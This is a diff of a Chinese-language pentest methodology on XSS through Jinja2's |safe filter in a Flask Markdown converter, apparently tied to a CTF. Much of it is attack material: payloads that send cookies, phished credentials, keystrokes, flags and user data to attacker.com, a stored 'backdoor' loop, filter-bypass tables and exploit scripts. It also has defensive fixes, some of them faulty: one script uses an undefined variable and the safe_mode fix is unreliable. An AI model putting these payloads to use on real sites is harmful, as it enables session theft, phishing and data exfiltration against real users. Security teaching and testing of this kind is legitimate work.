@@ -1,607 +1,376 @@
 # Jinja2 Safe 过滤器 XSS 攻击
 
-## 1. 方法论概述
+## 1. 概述
 
-### 1.1 编写目的
-本方法论指导渗透测试人员识别和利用 Jinja2 模板引擎中 `|safe` 过滤器滥用导致的跨站脚本（XSS）漏洞。
+### 1.1 漏洞原理
 
-### 1.2 适用范围
-- 使用 Jinja2 模板引擎的 Flask/Django 应用
-- 模板中使用 `|safe` 过滤器渲染用户输入
-- Markdown 转 HTML 后直接渲染
-- 无 HTML  sanitization 机制
+Jinja2 模板引擎默认启用 HTML 自动转义，但使用 `|safe` 过滤器会显式禁用转义，导致用户可控内容中的 HTML 标签和 JavaScript 代码被原样输出，从而产生 XSS 漏洞。
 
-### 1.3 读者对象
-- 渗透测试工程师
-- Python/Flask 安全研究人员
-- 代码审计人员
+### 1.2 脆弱代码模式
 
----
-
-## 2. 技术原理
-
-### 2.1 Jinja2 自动转义机制
-
-**默认行为：**
-```jinja2
-{{ user_input }}        {# 自动 HTML 实体编码 #}
-{{ user_input|safe }}   {# 禁用自动编码 - 危险！#}
-```
-
-**自动编码示例：**
-```
-输入：<script>alert(1)</script>
-
-默认输出：&lt;script&gt;alert(1)&lt;/script&gt;  {# 安全 #}
-|safe 输出：<script>alert(1)</script>            {# 危险！#}
-```
-
-### 2.2 Markdown 与 XSS
-
-**Python Markdown 行为：**
+**脆弱代码：**
 ```python
+# Flask 应用
+from flask import Flask, render_template, request
 import markdown
 
-# 默认配置保留原始 HTML
-content = "<script>alert(1)</script>"
-html = markdown.markdown(content)
-# 输出：<script>alert(1)</script>  (未过滤)
-```
+app = Flask(__name__)
 
-**危险代码模式：**
-```python
-# ❌ 危险代码
 @app.route('/convert', methods=['POST'])
 def convert():
     markdown_text = request.form.get('markdown_text')
-    html_content = markdown.markdown(markdown_text)  # 保留 HTML
+    html_content = markdown.markdown(markdown_text)  # 保留原始 HTML
     return render_template('converter.html', html_content=html_content)
 ```
 
-```jinja2
-{# ❌ 危险模板 #}
+```html
+<!-- converter.html 模板 -->
 <div class="output">
-    {{ html_content|safe }}  {# 禁用转义 - XSS！#}
+    {{ html_content|safe }}  {# ⚠️ 危险：禁用 HTML 转义 #}
 </div>
 ```
 
-### 2.3 漏洞组合
+### 1.3 攻击条件
 
-**完整攻击链：**
-```
-用户输入 Markdown
-    ↓
-markdown.markdown()  {# 保留原始 HTML #}
-    ↓
-{{ html_content|safe }}  {# 禁用 Jinja2 转义 #}
-    ↓
-浏览器执行 JavaScript  {# XSS！#}
-```
+- 应用使用 Jinja2 模板引擎
+- 模板中使用 `|safe` 过滤器渲染用户可控内容
+- 内容经过 markdown 处理但保留原始 HTML
+- 无 CSP 或其他 XSS 防护措施
 
 ---
 
-## 3. 攻击场景
+## 2. 攻击场景
 
-### 3.1 场景 1：直接 Markdown 注入
+### 2.1 基础 XSS 攻击
 
-**目标：** 通过 markdown_text 参数注入 XSS
-
-**攻击步骤：**
-
-1. **识别注入点**
-   ```bash
-   # 查找 Markdown 转换功能
-   POST /convert
-   Content-Type: application/x-www-form-urlencoded
-   
-   markdown_text=Test content
-   ```
-
-2. **测试基础 XSS**
-   ```bash
-   curl -X POST http://target/convert \
-     -d "markdown_text=<script>alert('XSS')</script>"
-   ```
-
-3. **验证响应**
-   ```html
-   <!-- 检查响应中是否包含未编码的 script 标签 -->
-   <div class="output">
-       <script>alert('XSS')</script>
-   </div>
-   ```
-
-### 3.2 场景 2：事件处理器注入
-
-**Payload 示例：**
+**攻击 Payload：**
 ```html
-<!-- 图片加载错误 -->
+<!-- 基础 Script 标签注入 -->
+<script>alert('XSS')</script>
+
+<!-- 图片错误处理注入 -->
 <img src=x onerror=alert('XSS')>
 
-<!-- SVG  onload -->
+<!-- SVG 注入 -->
 <svg onload=alert('XSS')>
 
-<!-- 鼠标事件 -->
-<div onmouseover=alert('XSS')>Hover me</div>
-
-<!-- 自动聚焦 -->
-<input autofocus onfocus=alert('XSS')>
+<!-- iframe 注入 -->
+<iframe src="javascript:alert('XSS')"></iframe>
 ```
 
-**完整攻击：**
+**利用步骤：**
 ```bash
-curl -X POST http://localhost:42369/convert \
-  -d "markdown_text=<img src=x onerror=alert('XSS-VULN-01-CONFIRMED')>"
+# 通过 curl 发送恶意 markdown
+curl -X POST http://target/convert \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'markdown_text=<img src=x onerror=alert(document.domain)>'
 ```
 
-### 3.3 场景 4：XSS + SSRF 链式攻击
+### 2.2 会话 Cookie 窃取
 
-**目标：** 结合 XSS 和 SSRF 提取 Flag
+**前提条件：**
+- 会话 Cookie 无 HttpOnly 标志
+- 应用有认证系统
 
 **攻击 Payload：**
 ```html
 <script>
-// 使用 SSRF 访问内部端点
+// 窃取 Cookie 并外带
+fetch('https://attacker.com/steal?cookie=' + 
+      encodeURIComponent(document.cookie));
+</script>
+```
+
+**Markdown 输入：**
+```markdown
+# 我的笔记
+
+<script>
+fetch('https://attacker.com/steal?cookie=' + document.cookie);
+</script>
+```
+
+### 2.3 钓鱼攻击
+
+**攻击 Payload：**
+```html
+<script>
+// 替换页面内容显示钓鱼表单
+document.body.innerHTML = `
+    <div style="text-align:center; margin-top:50px;">
+        <h2>会话已过期，请重新登录</h2>
+        <form action="https://attacker.com/phish" method="POST">
+            <input type="text" name="username" placeholder="用户名" required><br><br>
+            <input type="password" name="password" placeholder="密码" required><br><br>
+            <button type="submit">登录</button>
+        </form>
+    </div>
+`;
+</script>
+```
+
+### 2.4 键盘记录器
+
+**攻击 Payload：**
+```html
+<script>
+// 记录所有键盘输入
+document.addEventListener('keypress', function(e) {
+    fetch('https://attacker.com/log?key=' + 
+          encodeURIComponent(String.fromCharCode(e.which)));
+});
+</script>
+```
+
+---
+
+## 3. 高级攻击技术
+
+### 3.1 结合 SSRF 的组合攻击
+
+**场景：** 应用同时存在 XSS 和 SSRF 漏洞
+
+**攻击 Payload：**
+```html
+<script>
+// 通过 SSRF 访问内部管理端点
 fetch('/convert', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'url=http://127.0.0.1/admin/flag'
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'url=http://127.0.0.1/admin/flag'
 })
 .then(r => r.text())
 .then(html => {
-  // 提取 Flag 并显示
-  const flag = html.match(/flag\{[^}]+\}/)[0];
-  document.body.innerHTML = '<h1>FLAG: ' + flag + '</h1>';
-  
-  // 或外带到攻击者服务器
-  fetch('https://attacker.com/exfil?flag=' + flag);
+    // 提取 Flag
+    const flag = html.match(/flag\{[^}]+\}/)[0];
+    
+    // 外带 Flag
+    fetch('https://attacker.com/exfil?flag=' + encodeURIComponent(flag));
+    
+    // 在页面显示
+    document.body.innerHTML = '<h1>Flag: ' + flag + '</h1>';
 });
 </script>
 ```
 
 **攻击流程：**
 ```
-受害者访问恶意页面
+XSS Payload 注入
     ↓
-XSS Payload 执行
+JavaScript 执行
     ↓
-JavaScript 发起 SSRF 请求
+发起 SSRF 请求到 /convert
     ↓
-POST /convert?url=http://127.0.0.1/admin/flag
+服务器访问 http://127.0.0.1/admin/flag
     ↓
-服务器返回 Flag
+IP 认证绕过，返回 Flag
     ↓
-JavaScript 提取并外带 Flag
+JavaScript 提取并外带
 ```
 
----
+### 3.2 存储型 XSS 持久化攻击
 
-## 4. 探测与验证
+**场景：** Markdown 内容被存储并展示给其他用户
 
-### 4.1 黑盒测试
+**攻击步骤：**
 
-**步骤 1：识别 Jinja2 应用**
-```bash
-# 检查响应头
-curl -I http://target/
+1. **存储恶意内容**
+   ```markdown
+   # 技术分享
+   
+   <script>
+   // 持久化后门
+   setInterval(() => {
+       fetch('/api/user/data')
+           .then(r => r.json())
+           .then(data => {
+               fetch('https://attacker.com/collect', {
+                   method: 'POST',
+                   body: JSON.stringify(data)
+               });
+           });
+   }, 60000); // 每分钟执行
+   </script>
+   ```
 
-# 查找 Werkzeug/Flask 标识
-Server: Werkzeug/3.0.6 Python/3.8.20
-```
+2. **受害者访问**
+   - 管理员查看存储的 markdown
+   - JavaScript 在管理员浏览器执行
+   - 持续泄露数据
 
-**步骤 2：测试 XSS**
-```bash
-# 基础测试
-curl -X POST http://target/convert \
-  -d "markdown_text=<img src=x onerror=alert(1)>"
+### 3.3 绕过内容过滤
 
-# 检查响应
-curl -X POST http://target/convert \
-  -d "markdown_text=<img src=x onerror=alert(1)>" | grep -o "<img.*>"
-```
+**场景：** 应用过滤了部分危险标签
 
-**步骤 3：浏览器验证**
-```python
-# 使用 Playwright 验证
-from playwright.sync_api import sync_playwright
+**绕过技术：**
 
-with sync_playwright() as p:
-    browser = p.chromium.launch()
-    page = browser.new_page()
-    
-    # 导航到页面
-    page.goto('http://localhost:42369/')
-    
-    # 注入 XSS Payload
-    page.fill('textarea[name="markdown_text"]', 
-              '<img src=x onerror=alert("XSS-CONFIRMED")>')
-    page.click('button[type="submit"]')
-    
-    # 等待 alert
-    page.on('dialog', lambda dialog: print(f'Alert: {dialog.message}'))
-    
-    browser.close()
-```
+| 过滤规则 | 绕过方法 | Payload 示例 |
+|---------|---------|-------------|
+| 过滤 `<script>` | 使用 `<svg>` | `<svg onload=alert(1)>` |
+| 过滤 `onerror` | 使用 `onload` | `<svg onload=alert(1)>` |
+| 过滤 `alert` | 使用 `confirm/prompt` | `<img src=x onerror=confirm(1)>` |
+| 过滤空格 | 使用 Tab/换行 | `<svg/onload=alert(1)>` |
+| 过滤引号 | 使用反引号 | `` `<img/src=x onerror=alert(1)>` `` |
 
-### 4.2 白盒测试
-
-**代码审计检查点：**
-
-```python
-# 查找 |safe 过滤器使用
-grep -rn "|safe" templates/
-
-# 查找 markdown 渲染
-grep -rn "markdown.markdown" .
-
-# 查找模板渲染
-grep -rn "render_template" .
-```
-
-**危险模式：**
-```jinja2
-{# ❌ 危险模式 #}
-{{ user_input|safe }}
-{{ html_content|safe }}
-{{ content|safe }}
-
-{# ✅ 安全模式 #}
-{{ user_input }}  {# 自动转义 #}
-{{ user_input|e }}  {# 显式转义 #}
-```
-
-```python
-# ❌ 危险代码
-html_content = markdown.markdown(user_input)
-return render_template('page.html', html_content=html_content)
-```
-
-```jinja2
-{# 对应危险模板 #}
-<div>{{ html_content|safe }}</div>
-```
-
----
-
-## 5. 利用方法
-
-### 5.1 基础利用命令
-
-**单命令利用：**
-```bash
-curl -X POST http://localhost:42369/convert \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "markdown_text=<script>alert('XSS')</script>"
-```
-
-### 5.2 自动化利用脚本
-
-**Python 脚本：**
-```python
-#!/usr/bin/env python3
-"""
-Jinja2 Safe Filter XSS Exploitation
-利用 Jinja2 |safe 过滤器进行 XSS 攻击
-"""
-
-import requests
-
-TARGET = "http://localhost:42369"
-CONVERT_ENDPOINT = "/convert"
-
-# XSS Payload 列表
-PAYLOADS = [
-    "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert('XSS')>",
-    "<svg onload=alert('XSS')>",
-    "<body onload=alert('XSS')>",
-    "<iframe src='javascript:alert(\"XSS\")'>",
-    "<a href='javascript:alert(\"XSS\")'>Click</a>",
-]
-
-def test_xss(payload):
-    """测试 XSS Payload"""
-    response = requests.post(
-        f"{TARGET}{CONVERT_ENDPOINT}",
-        data={"markdown_text": payload}
-    )
-    
-    # 检查 Payload 是否在响应中未编码
-    if payload in response.text or payload.replace(' ', '') in response.text:
-        return True
-    return False
-
-def main():
-    print("[*] Testing XSS Payloads...")
-    
-    for payload in PAYLOADS:
-        if test_xss(payload):
-            print(f"[+] Vulnerable! Payload: {payload}")
-            print(f"[*] Full response:\n{response.text[:500]}")
-            break
-    else:
-        print("[-] No XSS detected")
-
-if __name__ == '__main__':
-    main()
-```
-
-### 5.3 XSS + SSRF 链式攻击脚本
-
-```python
-#!/usr/bin/env python3
-"""
-XSS + SSRF Chain Attack
-结合 XSS 和 SSRF 提取 Flag
-"""
-
-from playwright.sync_api import sync_playwright
-
-TARGET = "http://localhost:42369"
-
-# XSS + SSRF Payload
-PAYLOAD = """
-<script>
-fetch('/convert', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'url=http://127.0.0.1/admin/flag'
-})
-.then(r => r.text())
-.then(html => {
-  const flagMatch = html.match(/flag\\{[^}]+\\}/);
-  if (flagMatch) {
-    document.body.innerHTML = '<h1>FLAG EXTRACTED:</h1><pre>' + flagMatch[0] + '</pre>';
-  }
-});
-</script>
-"""
-
-def main():
-    with sync_playwright() as p:
-        browser = p.chromium.launch()
-        page = browser.new_page()
-        
-        # 导航到目标
-        page.goto(TARGET)
-        
-        # 注入 Payload
-        page.fill('textarea[name="markdown_text"]', PAYLOAD)
-        page.click('button[type="submit"]')
-        
-        # 等待 Flag 显示
-        page.wait_for_selector('pre', timeout=5000)
-        
-        # 提取 Flag
-        flag = page.query_selector('pre').inner_text()
-        print(f"[+] Flag: {flag}")
-        
-        browser.close()
-
-if __name__ == '__main__':
-    main()
-```
-
----
-
-## 6. 绕过技巧
-
-### 6.1 绕过标签过滤
-
-**当 `<script>` 被过滤时：**
-```html
-<!-- 使用 img + onerror -->
-<img src=x onerror=alert(1)>
-
-<!-- 使用 svg + onload -->
-<svg onload=alert(1)>
-
-<!-- 使用 body + onload -->
-<body onload=alert(1)>
-
-<!-- 使用 input + autofocus -->
-<input autofocus onfocus=alert(1)>
-
-<!-- 使用 marquee + onstart -->
-<marquee onstart=alert(1)>
-
-<!-- 使用 details + ontoggle -->
-<details ontoggle=alert(1) open>
-```
-
-### 6.2 绕过事件处理器过滤
-
-**当 onerror/onload 被过滤时：**
-```html
-<!-- 使用较少见的事件 -->
-<img src=x onerror=alert(1)>
-<img src=x onmouseover=alert(1)>
-<img src=x onmouseenter=alert(1)>
-
-<!-- 使用 CSS 表达式（旧浏览器） -->
-<style>
-body { background: url('javascript:alert(1)'); }
-</style>
-
-<!-- 使用 data URL -->
-<iframe src="data:text/html,<script>alert(1)</script>">
-```
-
-### 6.3 绕过引号过滤
-
-**当引号被过滤时：**
-```html
-<!-- 不使用引号 -->
-<img src=x onerror=alert(1)>
-
-<!-- 使用反引号 -->
-<img src=x onerror=alert(`XSS`)>
-
-<!-- 使用空格代替引号 -->
-<img src=x onerror=alert(1) >
-
-<!-- 使用斜杠 -->
-<img/src=x onerror=alert(1)>
-```
-
-### 6.4 Markdown 特定绕过
-
-**Markdown 语法中的 HTML：**
+**Markdown 特殊语法绕过：**
 ```markdown
-<!-- 直接 HTML -->
-<script>alert(1)</script>
+<!-- 使用 HTML 注释绕过 -->
+<img src=x onerror=<!-- -->alert(1)>
 
-<!-- Markdown 链接中的 JavaScript -->
-[Click](javascript:alert(1))
-
-<!-- Markdown 图片 XSS -->
-![alt](javascript:alert(1))
-
-<!-- 代码块中的 HTML（某些配置） -->
-    <script>alert(1)</script>
+<!-- 使用 CDATA -->
+<![CDATA[<script>alert(1)</script>]]>
 ```
 
 ---
 
-## 7. 影响评估
+## 4. 检测与验证
 
-### 7.1 直接危害
-- 会话 Cookie 窃取（如果无 HttpOnly）
-- 凭证钓鱼
-- 恶意重定向
-- 键盘记录
+### 4.1 自动化检测
 
-### 7.2 潜在危害
-- 结合 SSRF 提取内部数据
-- 横向移动到内部服务
-- 云环境凭证窃取
+**Payload 列表：**
+```
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<script>alert('XSS')</script>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+```
 
-### 7.3 CVSS 评分参考
-- **基础分数：** 8.2 (High)
-- **攻击向量：** Network (AV:N)
-- **攻击复杂度：** Low (AC:L)
-- **权限要求：** None (PR:N)
-- **用户交互：** Required (UI:R)
-- **机密性影响：** High (C:H)
-- **完整性影响：** Low (I:L)
-- **可用性影响：** None (A:N)
+**检测工具：**
+```bash
+# 使用 curl 测试
+for payload in '<img src=x onerror=alert(1)>' \
+               '<svg onload=alert(1)>' \
+               '<script>alert(1)</script>'; do
+    echo "Testing: $payload"
+    curl -X POST http://target/convert \
+         -d "markdown_text=$payload" | grep -o '<script>'
+done
+```
+
+### 4.2 手动验证
+
+**步骤 1：基础测试**
+```markdown
+输入：<img src=x onerror=alert('XSS-TEST')>
+预期：弹出 alert 对话框
+```
+
+**步骤 2：确认执行上下文**
+```html
+<script>
+alert('Domain: ' + document.domain);
+alert('Cookie: ' + document.cookie);
+</script>
+```
+
+**步骤 3：验证持久性**
+- 刷新页面确认是否持续执行
+- 检查是否为存储型 XSS
 
 ---
 
-## 8. 修复建议
+## 5. 防御措施
 
-### 8.1 移除 |safe 过滤器
+### 5.1 移除 |safe 过滤器
 
-**❌ 不安全：**
-```jinja2
-<div class="output">
-    {{ html_content|safe }}
-</div>
+**脆弱代码：**
+```html
+{{ html_content|safe }}
 ```
 
-**✅ 安全：**
-```jinja2
-<div class="output">
-    {{ html_content }}  {# 自动转义 #}
-</div>
+**修复代码：**
+```html
+<!-- 方案 1：启用自动转义 -->
+{{ html_content }}
+
+<!-- 方案 2：使用 escape 过滤器 -->
+{{ html_content|escape }}
 ```
 
-### 8.2 HTML Sanitization
+### 5.2 HTML 净化
 
 **使用 Bleach 库：**
 ```python
 import bleach
-import markdown
+from markdown import markdown
 
-# 安全的 Markdown 渲染
-def safe_markdown(content):
-    # 先转换为 HTML
-    html = markdown.markdown(content)
+@app.route('/convert', methods=['POST'])
+def convert():
+    markdown_text = request.form.get('markdown_text')
     
-    # 清理危险标签
+    # 转换为 HTML
+    html_content = markdown(markdown_text)
+    
+    # 净化 HTML，只允许安全标签
+    allowed_tags = ['p', 'br', 'strong', 'em', 'ul', 'li', 'h1', 'h2', 'h3']
+    allowed_attrs = {'a': ['href', 'title']}
     clean_html = bleach.clean(
-        html,
-        tags=[
-            'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
-            'ul', 'ol', 'li', 'blockquote', 'code', 'pre'
-        ],
-        attributes={},
+        html_content, 
+        tags=allowed_tags, 
+        attributes=allowed_attrs,
         strip=True
     )
     
-    return clean_html
-
-# 使用
-html_content = safe_markdown(markdown_text)
-return render_template('page.html', html_content=html_content)
+    return render_template('converter.html', html_content=clean_html)
 ```
 
-### 8.3 模板配置
+### 5.3 配置 Markdown 安全模式
 
-```jinja2
-{# 安全模板 #}
-<div class="raw-output">
-    <pre>{{ raw_content }}</pre>  {# 无 |safe，自动转义 #}
-</div>
-
-<div class="html-output">
-    {{ sanitized_html }}  {# 已清理的 HTML #}
-</div>
-```
-
----
-
-## 9. 参考资源
-
-- [Jinja2 Security Documentation](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
-- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-- [Bleach Library Documentation](https://bleach.readthedocs.io/)
-
----
-
-## 10. 实战案例
-
-### 10.1 CTF 挑战案例
-
-**目标：** Flask Markdown 转换器
-
-**漏洞代码：**
 ```python
-# app.py
-html_content = markdown.markdown(markdown_text)
-return render_template('converter.html', html_content=html_content)
+import markdown
+
+# 使用 safe_mode 移除 HTML
+html_content = markdown.markdown(
+    markdown_text,
+    safe_mode='escape'  # 转义所有 HTML
+)
+
+# 或使用 extensions
+html_content = markdown.markdown(
+    markdown_text,
+    extensions=['fenced_code', 'tables'],
+    output_format='html5'
+)
 ```
 
-```jinja2
-{# converter.html #}
-<div class="result">
-    {{ html_content|safe }}  {# XSS 漏洞 #}
-</div>
+### 5.4 实施 CSP
+
+```python
+@app.after_request
+def add_security_headers(response):
+    response.headers['Content-Security-Policy'] = (
+        "default-src 'self'; "
+        "script-src 'self'; "
+        "style-src 'self' 'unsafe-inline'; "
+        "img-src 'self' data: https:; "
+        "frame-ancestors 'none'"
+    )
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    return response
 ```
 
-**利用：**
-```bash
-curl -X POST http://localhost:42369/convert \
-  -d "markdown_text=<img src=x onerror=alert('XSS-CONFIRMED')>"
-```
+---
 
-**结果：** JavaScript 成功执行
+## 6. 攻击案例总结
 
-### 10.2 XSS + SSRF 链式攻击
+| 案例 | 脆弱点 | Payload | 影响 |
+|------|-------|---------|------|
+| Flask Markdown 转换器 | `{{ html_content\|safe }}` | `<img src=x onerror=fetch()>` | Flag 泄露 |
+| 博客系统 | 文章存储 + `|safe` | `<script>steal()</script>` | 管理员 Cookie 泄露 |
+| 文档管理系统 | 评论功能 + `|safe` | `<svg onload=keylog()>` | 键盘记录 |
 
-**Payload：**
-```html
-<script>
-fetch('/convert', {
-  method: 'POST',
-  body: 'url=http://127.0.0.1/admin/flag'
-})
-.then(r => r.text())
-.then(html => {
-  fetch('https://attacker.com/exfil?flag=' + 
-        encodeURIComponent(html.match(/flag\{[^}]+\}/)[0]));
-});
-</script>
-```
+---
 
-**结果：** Flag 成功外带
+## 7. 参考资源
+
+- [Jinja2 Security](https://jinja.palletsprojects.com/en/3.0.x/sandbox/)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [Bleach Documentation](https://bleach.readthedocs.io/)
+
+---
+
+**文档版本：** 1.0  
+**最后更新：** 2026 年 3 月  
+**适用场景：** CTF 挑战、渗透测试、安全审计
